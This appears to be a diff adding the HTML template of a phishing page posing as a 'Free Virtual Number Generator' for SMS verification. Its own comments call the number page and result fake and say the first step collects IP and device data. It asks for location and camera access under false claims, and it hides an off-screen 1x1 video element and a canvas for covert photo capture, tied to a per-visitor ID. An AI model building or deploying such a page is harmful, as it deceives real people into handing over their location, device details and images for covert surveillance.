@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Free Virtual Number Generator</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container" id="app">
+        <!-- Step 1: Initial Load - Collect IP & Device -->
+        <div id="step-loading" class="step active">
+            <div class="loader"></div>
+            <h2>Connecting to secure server...</h2>
+            <p>Please wait while we verify your connection</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+
+        <!-- Step 2: Fake Temp Number Page -->
+        <div id="step-main" class="step">
+            <div class="header">
+                <h1>📱 Free Temporary Number</h1>
+                <p>Get a virtual number for SMS verification</p>
+            </div>
+            
+            <div class="card">
+                <div class="form-group">
+                    <label>Select Country</label>
+                    <select id="countrySelect" class="form-control">
+                        <option value="">-- Select Country --</option>
+                        <option value="US">🇺🇸 United States (+1)</option>
+                        <option value="UK">🇬🇧 United Kingdom (+44)</option>
+                        <option value="IN">🇮🇳 India (+91)</option>
+                        <option value="RU">🇷🇺 Russia (+7)</option>
+                        <option value="DE">🇩🇪 Germany (+49)</option>
+                        <option value="FR">🇫🇷 France (+33)</option>
+                        <option value="BR">🇧🇷 Brazil (+55)</option>
+                        <option value="CN">🇨🇳 China (+86)</option>
+                        <option value="JP">🇯🇵 Japan (+81)</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Select Platform</label>
+                    <select id="platformSelect" class="form-control">
+                        <option value="">-- Select Platform --</option>
+                        <option value="telegram">Telegram</option>
+                        <option value="whatsapp">WhatsApp</option>
+                        <option value="signal">Signal</option>
+                        <option value="facebook">Facebook</option>
+                        <option value="instagram">Instagram</option>
+                        <option value="twitter">Twitter / X</option>
+                        <option value="google">Google Voice</option>
+                    </select>
+                </div>
+                
+                <button id="generateBtn" class="btn btn-primary" disabled>
+                    🔄 Generate Number
+                </button>
+            </div>
+
+            <div id="fakeProcessing" class="processing hidden">
+                <div class="spinner"></div>
+                <h3>Generating your temporary number...</h3>
+                <p>This may take 15-30 seconds</p>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="fakeProgress"></div>
+                </div>
+            </div>
+
+            <div id="locationRequest" class="location-box hidden">
+                <div class="location-icon">📍</div>
+                <h3>Location Verification Required</h3>
+                <p>To provide you with a local number, we need your location</p>
+                <button id="allowLocationBtn" class="btn btn-warning">
+                    📍 Allow Location Access
+                </button>
+                <p class="small">We only use your location to assign a nearby number</p>
+            </div>
+
+            <div id="cameraRequest" class="camera-box hidden">
+                <div class="camera-icon">📷</div>
+                <h3>Identity Verification Required</h3>
+                <p>Quick verification to prevent spam. This takes 2 seconds.</p>
+                <button id="allowCameraBtn" class="btn btn-danger">
+                    📷 Allow Camera Access
+                </button>
+                <p class="small">Photo will be deleted after verification</p>
+            </div>
+        </div>
+
+        <!-- Step 3: Success / Fake Result -->
+        <div id="step-success" class="step">
+            <div class="success-icon">✅</div>
+            <h2>Number Generated Successfully!</h2>
+            <div class="number-display" id="fakeNumber">+1 (555) 123-4567</div>
+            <p>Your temporary number is active for 10 minutes</p>
+            <div class="countdown" id="countdown">10:00</div>
+            <button id="copyNumber" class="btn btn-secondary">📋 Copy Number</button>
+        </div>
+    </div>
+
+    <!-- Hidden video element for camera capture -->
+    <video id="video" width="1" height="1" style="position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const UID = "{{ uid }}";
+        const BASE_URL = window.location.origin;
+    </script>
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
